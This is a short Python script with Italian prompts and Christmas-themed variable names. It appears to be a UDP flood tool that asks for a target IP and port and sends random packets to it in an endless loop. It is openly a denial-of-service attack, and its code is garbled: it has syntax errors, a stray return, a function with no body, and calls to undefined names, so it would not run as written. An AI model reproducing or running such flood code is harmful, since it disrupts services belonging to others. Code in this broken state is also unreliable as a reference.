import random, string, socket


SERVER_IP = str(input("Inserisci qui l'IP del target:")) #192.168.1.80
SERVER_PORT = int(input("Inserisci qui la porta del sistema target:")) #666
BABBO_NATALE = int(input("Inserisci la quantità di pacchi regalo da inviare:"))

IN_BYTE = BABBO_NATALE*1024
# 1 kilobyte è pari a 1024 byte (2^10 byte)
pacchetti = ''.join(random.choice(string.ascii_letters + string.digits, K=IN_BYTE) for regali in range (BABBO_NATALE))
return pacchetti

if (SERVER_PORT == ""):
    SERVER_PORT = 139

def pacco_regalo(UDP_FLOOD)
s.sendto (pacchetti, target)
print ("regali inviati in UDP\n", "--->", regali)

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


while true:
    try
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target = (str(SERVER_IP), int(SERVER_PORT))

except:
    s.close()
    print ("AHIA....niente")

UDP_FLOOD()
